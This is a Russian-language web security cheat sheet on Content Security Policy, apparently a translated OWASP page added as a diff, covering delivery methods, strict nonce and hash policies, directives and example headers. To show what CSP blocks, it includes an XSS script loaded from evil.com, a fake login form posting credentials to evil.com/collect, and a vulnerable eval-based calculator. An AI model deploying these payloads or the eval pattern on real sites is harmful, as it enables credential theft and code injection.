+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_17" class="md-nav__link">
+    <span class="md-ellipsis">
+      Рефакторинг встроенного кода
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_18" class="md-nav__link">
+    <span class="md-ellipsis">
+      Ссылки
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+  
+  
+
+
+<h1 id="content-security-policy">Шпаргалка по Content Security Policy<a class="headerlink" href="#content-security-policy" title="Permanent link">&para;</a></h1>
+<h2 id="_1">Введение<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p>В этой статье рассматривается способ интеграции концепции <strong>эшелонированной защиты</strong> на стороне клиента веб-приложений. Внедряя заголовки Content-Security-Policy (CSP) на стороне сервера, браузер получает информацию о контенте и возможность защищать пользователя от динамических вызовов, загружающих содержимое на посещаемую страницу.</p>
+<h2 id="_2">Контекст<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<p>Рост числа уязвимостей XSS (межсайтовый скриптинг), Clickjacking и утечек на стороне браузера требует более <strong>эшелонированного</strong> подхода к безопасности.</p>
+<h3 id="xss">Защита от XSS<a class="headerlink" href="#xss" title="Permanent link">&para;</a></h3>
+<p>CSP защищает от XSS-атак следующими способами:</p>
+<h4 id="1">1. Ограничение встроенных скриптов<a class="headerlink" href="#1" title="Permanent link">&para;</a></h4>
+<p>Запрещая странице выполнять встроенные скрипты, атаки вроде внедрения</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">innerHTML</span><span class="o">=</span><span class="s1">&#39;defaced&#39;</span><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</code></pre></div>
+<p>не сработают.</p>
+<h4 id="2">2. Ограничение удалённых скриптов<a class="headerlink" href="#2" title="Permanent link">&para;</a></h4>
+<p>Запрещая странице загружать скрипты с произвольных серверов, атаки вроде внедрения</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;https://evil.com/hacked.js&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</code></pre></div>
+<p>не сработают.</p>
+<h4 id="3-javascript">3. Ограничение небезопасного JavaScript<a class="headerlink" href="#3-javascript" title="Permanent link">&para;</a></h4>
+<p>Запрещая странице выполнять функции преобразования текста в JavaScript, такие как <code>eval</code>, сайт будет защищён от подобных уязвимостей:</p>
+<div class="highlight"><pre><span></span><code><span class="c1">// Простой калькулятор</span>
+<span class="kd">var</span><span class="w"> </span><span class="nx">op1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">getUrlParameter</span><span class="p">(</span><span class="s2">&quot;op1&quot;</span><span class="p">);</span>
+<span class="kd">var</span><span class="w"> </span><span class="nx">op2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">getUrlParameter</span><span class="p">(</span><span class="s2">&quot;op2&quot;</span><span class="p">);</span>
+<span class="kd">var</span><span class="w"> </span><span class="nx">sum</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">eval</span><span class="p">(</span><span class="sb">`</span><span class="si">${</span><span class="nx">op1</span><span class="si">}</span><span class="sb"> + </span><span class="si">${</span><span class="nx">op2</span><span class="si">}</span><span class="sb">`</span><span class="p">);</span>
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`The sum is: </span><span class="si">${</span><span class="nx">sum</span><span class="si">}</span><span class="sb">`</span><span class="p">);</span>
+</code></pre></div>
+<h4 id="4">4. Ограничение отправки форм<a class="headerlink" href="#4" title="Permanent link">&para;</a></h4>
+<p>Ограничивая адреса, на которые HTML-формы вашего сайта могут отправлять данные, внедрение фишинговых форм также не сработает.</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">form</span> <span class="na">method</span><span class="o">=</span><span class="s">&quot;POST&quot;</span> <span class="na">action</span><span class="o">=</span><span class="s">&quot;https://evil.com/collect&quot;</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">h3</span><span class="p">&gt;</span>Session expired! Please login again.<span class="p">&lt;/</span><span class="nt">h3</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">label</span><span class="p">&gt;</span>Username<span class="p">&lt;/</span><span class="nt">label</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;text&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;username&quot;</span><span class="p">/&gt;</span>
+
+<span class="p">&lt;</span><span class="nt">label</span><span class="p">&gt;</span>Password<span class="p">&lt;/</span><span class="nt">label</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;password&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;pass&quot;</span><span class="p">/&gt;</span>
+
+<span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;Submit&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;Login&quot;</span><span class="p">/&gt;</span>
+<span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+</code></pre></div>
+<h4 id="5">5. Ограничение объектов<a class="headerlink" href="#5" title="Permanent link">&para;</a></h4>
+<p>Ограничивая HTML-тег <a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/object">object</a>, злоумышленник также не сможет внедрить на страницу вредоносные Flash/Java или другие устаревшие исполняемые файлы.</p>
+<h3 id="_3">Защита от атак через фреймирование<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h3>
+<p>Атаки вроде Clickjacking и некоторые варианты атак с утечкой через сторонний канал браузера (xs-leaks) требуют, чтобы вредоносный сайт загружал целевой сайт во фрейме.</p>
+<p>Исторически для этого использовался заголовок <code>X-Frame-Options</code>, однако он был объявлен устаревшим в пользу директивы CSP <code>frame-ancestors</code>.</p>
+<h3 id="_4">Эшелонированная защита<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
+<p>Строгая CSP обеспечивает эффективный <strong>второй уровень</strong> защиты от различных типов уязвимостей, особенно XSS. Хотя CSP не предотвращает наличие уязвимостей в веб-приложениях, она может значительно усложнить злоумышленнику их эксплуатацию.</p>
+<p>Даже на полностью статическом сайте, не принимающем пользовательский ввод, CSP можно использовать для обеспечения применения <a href="https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity">Subresource Integrity (SRI)</a>. Это помогает предотвратить загрузку вредоносного кода на сайт в случае компрометации одного из сторонних сайтов, хранящих JavaScript-файлы (например, аналитические скрипты).</p>
+<p>При всём сказанном, <strong>не следует</strong> полагаться на CSP как на единственный механизм защиты от XSS. Вы по-прежнему должны следовать лучшим практикам разработки, описанным в <a href="Cross_Site_Scripting_Prevention_Cheat_Sheet.html">Cross-Site Scripting Prevention Cheat Sheet</a>, и лишь затем добавлять CSP в качестве дополнительного уровня безопасности.</p>
+<h2 id="_5">Доставка политики<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h2>
+<p>Вы можете доставить Content Security Policy на свой сайт тремя способами.</p>
+<h3 id="1-content-security-policy">1. Заголовок Content-Security-Policy<a class="headerlink" href="#1-content-security-policy" title="Permanent link">&para;</a></h3>
+<p>Отправляйте HTTP-заголовок ответа Content-Security-Policy с вашего веб-сервера.</p>
+<div class="highlight"><pre><span></span><code>Content-Security-Policy: ...
+</code></pre></div>
+<p>Использование заголовка является предпочтительным способом и поддерживает полный набор функций CSP. Отправляйте его во всех HTTP-ответах, а не только на главной странице.</p>
+<p>Это стандартный заголовок спецификации W3C. Поддерживается Firefox 23+, Chrome 25+ и Opera 19+.</p>
+<h3 id="2-content-security-policy-report-only">2. Заголовок Content-Security-Policy-Report-Only<a class="headerlink" href="#2-content-security-policy-report-only" title="Permanent link">&para;</a></h3>
+<p>Используя <code>Content-Security-Policy-Report-Only</code>, можно доставить CSP без её применения.</p>
+<div class="highlight"><pre><span></span><code>Content-Security-Policy-Report-Only: ...
+</code></pre></div>
+<p>При этом нарушения всё равно выводятся в консоль и доставляются в конечную точку нарушений, если используются директивы <code>report-to</code> и <code>report-uri</code>.</p>
+<p>Это также стандартный заголовок спецификации W3C. Поддерживается Firefox 23+, Chrome 25+ и Opera 19+; политика не блокирует («fail open»), а отчёт отправляется на URL, указанный в директиве <code>report-uri</code> (или новой <code>report-to</code>). Это часто используется как предварительный шаг перед применением CSP в режиме блокировки («fail closed»).</p>
+<p>Браузеры полностью поддерживают одновременное использование сайтом <code>Content-Security-Policy</code> и <code>Content-Security-Policy-Report-Only</code> без каких-либо проблем. Этот паттерн можно использовать, например, для запуска строгой политики <code>Report-Only</code> (для получения большого количества отчётов о нарушениях) при наличии более мягкой применяемой политики (чтобы не нарушать легитимный функционал сайта).</p>
+<h3 id="3-meta-content-security-policy">3. Meta-тег Content-Security-Policy<a class="headerlink" href="#3-meta-content-security-policy" title="Permanent link">&para;</a></h3>
+<p>Иногда невозможно использовать заголовок Content-Security-Policy, например при размещении HTML-файлов в CDN, где заголовки находятся вне вашего контроля.</p>
+<p>В этом случае CSP по-прежнему можно использовать, указав meta-тег <code>http-equiv</code> в HTML-разметке:</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">meta</span> <span class="na">http-equiv</span><span class="o">=</span><span class="s">&quot;Content-Security-Policy&quot;</span> <span class="na">content</span><span class="o">=</span><span class="s">&quot;...&quot;</span><span class="p">&gt;</span>
+</code></pre></div>
+<p>Почти всё поддерживается, включая полную защиту от XSS. Однако вы не сможете использовать <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors">защиту от фреймирования</a>, <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox">изолирование</a> или <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/report-to">конечную точку журналирования нарушений CSP</a>.</p>
+<h3 id="_6">ПРЕДУПРЕЖДЕНИЕ<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h3>
+<p><strong>НЕ</strong> используйте <code>X-Content-Security-Policy</code> или <code>X-WebKit-CSP</code>. Их реализации устарели (начиная с Firefox 23, Chrome 25), ограничены, непоследовательны и крайне ненадёжны.</p>
+<h2 id="csp">Типы CSP (гранулярный/на основе списков разрешений или строгий)<a class="headerlink" href="#csp" title="Permanent link">&para;</a></h2>
+<p>Исходный механизм построения CSP предполагал создание списков разрешённых источников, определяющих контент и источники, допустимые в контексте HTML-страницы.</p>
+<p>Однако современная лучшая практика — создавать «строгую» CSP, которую значительно проще развёртывать и которая более безопасна, поскольку менее вероятно будет обойдена.</p>
+<h2 id="csp_1">Строгая CSP<a class="headerlink" href="#csp_1" title="Permanent link">&para;</a></h2>
+<p>Строгая CSP может быть создана с использованием ограниченного набора гранулярных <a href="#fetch-directives">директив Fetch, перечисленных ниже</a>, в сочетании с одним из двух механизмов:</p>
+<ul>
+<li>На основе nonce</li>
+<li>На основе хеша</li>
+</ul>
+<p>Директива <code>strict-dynamic</code> может также опционально использоваться для упрощения реализации строгой CSP.</p>
+<p>Следующие разделы содержат базовые рекомендации по этим механизмам, однако настоятельно рекомендуется следовать подробным и методичным инструкциям Google по созданию строгой CSP:</p>
+<p><strong><a href="https://web.dev/strict-csp/">Mitigate cross-site scripting (XSS) with a strict Content Security Policy (CSP)</a></strong></p>
+<h3 id="nonce">На основе nonce<a class="headerlink" href="#nonce" title="Permanent link">&para;</a></h3>
+<p>Nonce — это уникальные одноразовые случайные значения, которые вы генерируете для каждого HTTP-ответа и добавляете в заголовок Content-Security-Policy:</p>
+<div class="highlight"><pre><span></span><code><span class="kd">const</span><span class="w"> </span><span class="nx">nonce</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">uuid</span><span class="p">.</span><span class="nx">v4</span><span class="p">();</span>
+<span class="nx">scriptSrc</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="sb">` &#39;nonce-</span><span class="si">${</span><span class="nx">nonce</span><span class="si">}</span><span class="sb">&#39;`</span><span class="p">;</span>
+</code></pre></div>
+<p>Затем этот nonce передаётся в ваше представление (использование nonce требует нестатического HTML) и отображается в тегах script примерно так:</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">script</span> <span class="na">nonce</span><span class="o">=</span><span class="s">&quot;&lt;%= nonce %&gt;&quot;</span><span class="p">&gt;</span>
+<span class="w">    </span><span class="p">...</span>
+<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</code></pre></div>
+<h4 id="_7">Предупреждение<a class="headerlink" href="#_7" title="Permanent link">&para;</a></h4>
+<p><strong>Не</strong> создавайте промежуточное ПО, заменяющее все теги script на «script nonce=...», поскольку внедрённые злоумышленником скрипты также получат nonce. Для использования nonce необходим настоящий движок HTML-шаблонов.</p>
+<h3 id="_8">Хеши<a class="headerlink" href="#_8" title="Permanent link">&para;</a></h3>
+<p>Когда необходимы встроенные скрипты, <code>script-src 'hash_algo-hash'</code> — ещё один вариант, позволяющий выполняться только конкретным скриптам.</p>
+<div class="highlight"><pre><span></span><code>Content-Security-Policy: script-src &#39;sha256-V2kaaafImTjn8RQTWZmF4IfGfQ7Qsqsw9GWaFjzFNPg=&#39;
+</code></pre></div>
+<p>Чтобы получить хеш, изучите нарушения в инструментах разработчика Google Chrome, например такие:</p>
+<blockquote>
+<p>❌ Refused to execute inline script because it violates the following Content Security Policy directive: "..." Either the 'unsafe-inline' keyword, a hash (<strong>'sha256-V2kaaafImTjn8RQTWZmF4IfGfQ7Qsqsw9GWaFjzFNPg='</strong>), or a nonce...</p>
+</blockquote>
+<p>Также можно использовать этот <a href="https://report-uri.com/home/hash">генератор хешей</a>. Вот отличный <a href="https://csp.withgoogle.com/docs/faq.html#static-content">пример</a> использования хешей.</p>
+<h4 id="_9">Примечание<a class="headerlink" href="#_9" title="Permanent link">&para;</a></h4>
+<p>Использование хешей может быть рискованным подходом. Если вы измените <em>что-либо</em> внутри тега script (даже пробел), например при форматировании кода, хеш изменится и скрипт не будет отображаться.</p>
+<h3 id="strict-dynamic">strict-dynamic<a class="headerlink" href="#strict-dynamic" title="Permanent link">&para;</a></h3>
+<p>Директива <code>strict-dynamic</code> может использоваться в составе строгой CSP в сочетании с хешами или nonce.</p>
+<p>Если блок скрипта с правильным хешем или nonce создаёт дополнительные элементы DOM и выполняет JS внутри них, <code>strict-dynamic</code> сообщает браузеру о необходимости доверять этим элементам, не требуя явного указания nonce или хешей для каждого из них.</p>
+<p>Обратите внимание, что хотя <code>strict-dynamic</code> является функцией CSP level 3, CSP level 3 очень широко поддерживается в распространённых современных браузерах.</p>
+<p>Подробнее см. <a href="https://w3c.github.io/webappsec-csp/#strict-dynamic-usage">strict-dynamic usage</a>.</p>
+<h2 id="csp_2">Подробные директивы CSP<a class="headerlink" href="#csp_2" title="Permanent link">&para;</a></h2>
+<p>Существует несколько типов директив, позволяющих разработчику гранулярно управлять применением политик. Обратите внимание, что создание нестрогой политики с излишней детализацией или чрезмерно мягкими настройками может привести к её обходу и потере защиты.</p>
+<h3 id="fetch">Директивы Fetch<a class="headerlink" href="#fetch" title="Permanent link">&para;</a></h3>
+<p>Директивы Fetch указывают браузеру, каким источникам доверять и откуда загружать ресурсы.</p>
+<p>Большинство директив Fetch имеют определённый <a href="https://www.w3.org/TR/CSP3/#directive-fallback-list">список запасных вариантов, указанный в w3</a>. Этот список позволяет гранулярно управлять источниками скриптов, изображений, файлов и т.д.</p>
+<ul>
+<li><code>child-src</code> позволяет разработчику контролировать вложенные контексты просмотра и контексты выполнения веб-воркеров.</li>
+<li><code>connect-src</code> обеспечивает контроль над fetch-запросами, XHR, eventsource, beacon и соединениями websocket.</li>
+<li><code>font-src</code> указывает URL для загрузки шрифтов.</li>
+<li><code>img-src</code> указывает URL, с которых могут загружаться изображения.</li>
+<li><code>manifest-src</code> указывает URL, с которых могут загружаться манифесты приложения.</li>
+<li><code>media-src</code> указывает URL, с которых могут загружаться видео, аудио и текстовые дорожки.</li>
+<li><code>prefetch-src</code> указывает URL, с которых ресурсы могут быть предварительно загружены.</li>
+<li><code>object-src</code> указывает URL, с которых могут загружаться плагины.</li>
+<li><code>script-src</code> указывает источники, из которых может выполняться скрипт. Является запасной директивой для других директив, связанных со скриптами.<ul>
+<li><code>script-src-elem</code> контролирует источники выполнения скриптовых запросов и блоков.</li>
+<li><code>script-src-attr</code> контролирует выполнение обработчиков событий.</li>
+</ul>
+</li>
+<li><code>style-src</code> контролирует источники применяемых к документу стилей. Включает элементы <code>&lt;link&gt;</code>, правила <code>@import</code> и запросы из заголовка HTTP-ответа <code>Link</code>.<ul>
+<li><code>style-src-elem</code> контролирует стили, за исключением встроенных атрибутов.</li>
+<li><code>style-src-attr</code> контролирует атрибуты стилей.</li>
+</ul>
+</li>
+<li><code>default-src</code> является запасной директивой для других директив Fetch. Явно указанные директивы не наследуются; директивы, которые не указаны, используют значение <code>default-src</code> в качестве запасного.</li>
+</ul>
+<h3 id="_10">Директивы документа<a class="headerlink" href="#_10" title="Permanent link">&para;</a></h3>
+<p>Директивы документа указывают браузеру свойства документа, к которому будут применяться политики.</p>
+<ul>
+<li><code>base-uri</code> указывает допустимые URL для элемента <code>&lt;base&gt;</code>.</li>
+<li><code>plugin-types</code> ограничивает типы ресурсов, которые могут быть загружены в документ (<em>например</em>, <code>application/pdf</code>). К затронутым элементам <code>&lt;embed&gt;</code> и <code>&lt;object&gt;</code> применяются 3 правила:<ul>
+<li>Элемент должен явно объявлять свой тип.</li>
+<li>Тип элемента должен совпадать с объявленным типом.</li>
+<li>Ресурс элемента должен соответствовать объявленному типу.</li>
+</ul>
+</li>
+<li><code>sandbox</code> ограничивает действия страницы, такие как отправка форм.<ul>
+<li>Применяется только при использовании с заголовком запроса <code>Content-Security-Policy</code>.</li>
+<li>Если значение директивы не указано, активируются все ограничения изолирования. <code>Content-Security-Policy: sandbox;</code></li>
+<li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox#Syntax">Синтаксис sandbox</a></li>
+</ul>
+</li>
+</ul>
+<h3 id="_11">Директивы навигации<a class="headerlink" href="#_11" title="Permanent link">&para;</a></h3>
+<p>Директивы навигации указывают браузеру, куда документ может переходить или откуда он может быть встроен.</p>
+<ul>
+<li><code>form-action</code> ограничивает URL, на которые формы могут отправлять данные.</li>
+<li><code>frame-ancestors</code> ограничивает URL, которые могут встраивать запрошенный ресурс в элементы <code>&lt;frame&gt;</code>, <code>&lt;iframe&gt;</code>, <code>&lt;object&gt;</code>, <code>&lt;embed&gt;</code> или <code>&lt;applet&gt;</code>.<ul>
+<li>Если эта директива указана в теге <code>&lt;meta&gt;</code>, она игнорируется.</li>
+<li>Эта директива не использует <code>default-src</code> в качестве запасного варианта.</li>
+<li><code>X-Frame-Options</code> считается устаревшим этой директивой и игнорируется пользовательскими агентами.</li>
+</ul>
+</li>
+</ul>
+<h3 id="_12">Директивы отчётности<a class="headerlink" href="#_12" title="Permanent link">&para;</a></h3>
+<p>Директивы отчётности доставляют нарушения запрещённых действий на указанные конечные точки. Эти директивы не имеют самостоятельного назначения и зависят от других директив.</p>
+<ul>
+<li><code>report-to</code> — имя группы, определённое в заголовке в виде JSON-форматированного значения.<ul>
+<li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/report-to">Документация MDN по report-to</a></li>
+</ul>
+</li>
+<li>Директива <code>report-uri</code> устарела в пользу <code>report-to</code>; представляет собой URI, на который отправляются отчёты.<ul>
+<li>Формат: <code>Content-Security-Policy: report-uri https://example.com/csp-reports</code></li>
+</ul>
+</li>
+</ul>
+<p>Для обеспечения обратной совместимости используйте обе директивы совместно. Если браузер поддерживает <code>report-to</code>, он будет игнорировать <code>report-uri</code>. В противном случае будет использоваться <code>report-uri</code>.</p>
+<h3 id="_13">Специальные источники директив<a class="headerlink" href="#_13" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>Значение</th>
+<th>Описание</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>'none'</td>
+<td>Ни один URL не соответствует.</td>
+</tr>
+<tr>
+<td>'self'</td>
+<td>Относится к исходному сайту с той же схемой и номером порта.</td>
+</tr>
+<tr>
+<td>'unsafe-inline'</td>
+<td>Разрешает использование встроенных скриптов или стилей.</td>
+</tr>
+<tr>
+<td>'unsafe-eval'</td>
+<td>Разрешает использование eval в скриптах.</td>
+</tr>
+</tbody>
+</table>
+<p>Чтобы лучше понять, как работают источники директив, ознакомьтесь со <a href="https://w3c.github.io/webappsec-csp/#framework-directive-source-list">списками источников на w3c</a>.</p>
+<h2 id="csp_3">Примеры политик CSP<a class="headerlink" href="#csp_3" title="Permanent link">&para;</a></h2>
+<h3 id="_14">Строгая политика<a class="headerlink" href="#_14" title="Permanent link">&para;</a></h3>
+<p>Роль строгой политики — защита от классических хранимых, отражённых и некоторых DOM XSS-атак; это должна быть оптимальная цель для любой команды, внедряющей CSP.</p>
+<p>Как отмечалось выше, Google разработал подробные и методичные <a href="https://web.dev/strict-csp">инструкции</a> по созданию строгой CSP.</p>
+<p>На основе этих инструкций для применения строгой политики можно использовать одну из двух следующих политик:</p>
+<h4 id="nonce_1">Строгая политика на основе nonce<a class="headerlink" href="#nonce_1" title="Permanent link">&para;</a></h4>
+<div class="highlight"><pre><span></span><code>Content-Security-Policy:
+  script-src &#39;nonce-{RANDOM}&#39; &#39;strict-dynamic&#39;;
+  object-src &#39;none&#39;;
+  base-uri &#39;none&#39;;
+</code></pre></div>
+<h4 id="_15">Строгая политика на основе хеша<a class="headerlink" href="#_15" title="Permanent link">&para;</a></h4>
+<div class="highlight"><pre><span></span><code>Content-Security-Policy:
+  script-src &#39;sha256-{HASHED_INLINE_SCRIPT}&#39; &#39;strict-dynamic&#39;;
+  object-src &#39;none&#39;;
+  base-uri &#39;none&#39;;
+</code></pre></div>
+<h3 id="csp_4">Базовая нестрогая политика CSP<a class="headerlink" href="#csp_4" title="Permanent link">&para;</a></h3>
+<p>Эта политика может использоваться, если создать строгую политику невозможно. Она предотвращает межсайтовое фреймирование и межсайтовую отправку форм. Разрешаются только ресурсы из исходного домена для всех директив по умолчанию; выполнение встроенных скриптов/стилей не допускается.</p>
+<p>Если ваше приложение функционирует при этих ограничениях, поверхность атаки значительно сокращается, и политика работает с большинством современных браузеров.</p>
+<p>Наиболее базовая политика предполагает:</p>
+<ul>
+<li>Все ресурсы размещаются в том же домене, что и документ.</li>
+<li>Нет встроенных скриптов или eval для скриптов и ресурсов стилей.</li>
+<li>Другим сайтам не требуется встраивать данный сайт во фрейм.</li>
+<li>Формы не отправляются на внешние сайты.</li>
+</ul>
+<div class="highlight"><pre><span></span><code>Content-Security-Policy: default-src &#39;self&#39;; frame-ancestors &#39;self&#39;; form-action &#39;self&#39;;
+</code></pre></div>
+<p>Для большего ужесточения можно применить следующее:</p>
+<div class="highlight"><pre><span></span><code>Content-Security-Policy: default-src &#39;none&#39;; script-src &#39;self&#39;; connect-src &#39;self&#39;; img-src &#39;self&#39;; style-src &#39;self&#39;; frame-ancestors &#39;self&#39;; form-action &#39;self&#39;;
+</code></pre></div>
+<p>Эта политика разрешает изображения, скрипты, AJAX и CSS из того же источника и не разрешает загружать никакие другие ресурсы (например, объекты, фреймы, медиа и т.д.).</p>
+<h3 id="_16">Обновление небезопасных запросов<a class="headerlink" href="#_16" title="Permanent link">&para;</a></h3>
+<p>Если разработчик выполняет миграцию с HTTP на HTTPS, следующая директива гарантирует отправку всех запросов через HTTPS без отступления к HTTP:</p>
+<div class="highlight"><pre><span></span><code>Content-Security-Policy: upgrade-insecure-requests;
+</code></pre></div>
+<h3 id="clickjacking">Предотвращение атак через фреймирование (Clickjacking, межсайтовые утечки)<a class="headerlink" href="#clickjacking" title="Permanent link">&para;</a></h3>
+<ul>
+<li>Чтобы полностью запретить встраивание вашего контента во фреймы, используйте:<ul>
+<li><code>Content-Security-Policy: frame-ancestors 'none';</code></li>
+</ul>
+</li>
+<li>Чтобы разрешить фреймирование самим сайтом, используйте:<ul>
+<li><code>Content-Security-Policy: frame-ancestors 'self';</code></li>
+</ul>
+</li>
+<li>Чтобы разрешить фреймирование доверенным доменом, используйте:<ul>
+<li><code>Content-Security-Policy: frame-ancestors trusted.com;</code></li>
+</ul>
+</li>
+</ul>
+<h3 id="_17">Рефакторинг встроенного кода<a class="headerlink" href="#_17" title="Permanent link">&para;</a></h3>
+<p>Когда директивы <code>default-src</code> или <code>script-src*</code> активны, CSP по умолчанию отключает любой JavaScript-код, размещённый непосредственно в HTML-источнике, например такой:</p>
+<div class="highlight"><pre><span></span><code><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
+<span class="kd">var</span><span class="w"> </span><span class="nx">foo</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;314&quot;</span>
+<span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
+</code></pre></div>
+<p>Встроенный код можно перенести в отдельный JavaScript-файл, и код на странице станет:</p>
+<div class="highlight"><pre><span></span><code><span class="o">&lt;</span><span class="nx">script</span><span class="w"> </span><span class="nx">src</span><span class="o">=</span><span class="s2">&quot;app.js&quot;</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="err">/script&gt;</span>
+</code></pre></div>
+<p>При этом <code>app.js</code> будет содержать код <code>var foo = "314"</code>.</p>
+<p>Ограничение встроенного кода также распространяется на <code>встроенные обработчики событий</code>, поэтому следующая конструкция будет заблокирована в CSP:</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">button</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;button1&quot;</span> <span class="na">onclick</span><span class="o">=</span><span class="s">&quot;doSomething()&quot;</span><span class="p">&gt;</span>
+</code></pre></div>
+<p>Её следует заменить вызовами <code>addEventListener</code>:</p>
+<div class="highlight"><pre><span></span><code><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&quot;button1&quot;</span><span class="p">).</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">&#39;click&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">doSomething</span><span class="p">);</span>
+</code></pre></div>
+<h2 id="_18">Ссылки<a class="headerlink" href="#_18" title="Permanent link">&para;</a></h2>
+<ul>
+<li><a href="https://web.dev/strict-csp">Strict CSP</a></li>
+<li><a href="https://www.w3.org/TR/CSP3/">CSP Level 3 W3C</a></li>
+<li><a href="https://content-security-policy.com/">Content-Security-Policy</a></li>
+<li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy">MDN CSP</a></li>
+<li><a href="https://en.wikipedia.org/wiki/Content_Security_Policy">CSP Wikipedia</a></li>
+<li><a href="https://scotthelme.co.uk/csp-cheat-sheet/">CSP CheatSheet by Scott Helme</a></li>
+<li><a href="https://www.slideshare.net/LukasWeichselbaum/breaking-bad-csp">Breaking Bad CSP</a></li>
+<li><a href="https://speakerdeck.com/lweichselbaum/csp-a-successful-mess-between-hardening-and-mitigation">CSP A Successful Mess Between Hardening And Mitigation</a></li>
+<li><a href="https://www.appsecmonkey.com/blog/content-security-policy-header/">Content Security Policy Guide on AppSec Monkey</a></li>
+<li>Генератор CSP: <a href="https://chrome.google.com/webstore/detail/content-security-policy-c/ahlnecfloencbkpfnpljbojmjkfgnmdc">Chrome</a>/<a href="https://addons.mozilla.org/en-US/firefox/addon/csp-generator/">Firefox</a></li>
+<li><a href="https://csp-evaluator.withgoogle.com/">CSP evaluator</a></li>
+</ul>
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+    <div class="md-copyright__highlight">
+      ©Copyright <script>document.write(new Date().getFullYear())</script> - Cheat Sheets Series Team - This work is licensed under <a rel="license" href="https://creativecommons.org/licenses/by-sa/4.0/">Creative Commons Attribution-ShareAlike 4.0 International</a>.
+    </div>
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    <script id="__config" type="application/json">{"base": "..", "features": ["navigation.sections", "navigation.expand"], "search": "../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    
+    
+      <script src="../assets/javascripts/bundle.83f73b43.min.js"></script>
+      
+    
+  </body>
+</html>
